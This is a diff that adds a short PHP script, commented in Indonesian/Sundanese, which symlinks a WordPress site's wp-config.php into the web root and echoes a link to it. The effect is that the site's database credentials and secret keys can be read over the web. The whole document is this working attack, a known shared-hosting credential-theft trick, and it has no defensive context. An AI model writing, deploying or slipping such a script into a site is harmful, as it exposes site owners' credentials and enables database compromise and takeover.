@@ -1,0 +1,10 @@
+<?php
+$target = "/home/user/public_html/wp-config.php"; // Path asli file wp-config.php
+$link = "wp-config-symlink.php"; // Symlink di web root
+
+if (symlink($target, $link)) {
+    echo "Symlink berhasil: <a href='$link'>$link</a>";
+} else {
+    echo "Gagal nyieun symlink!";
+}
+?>
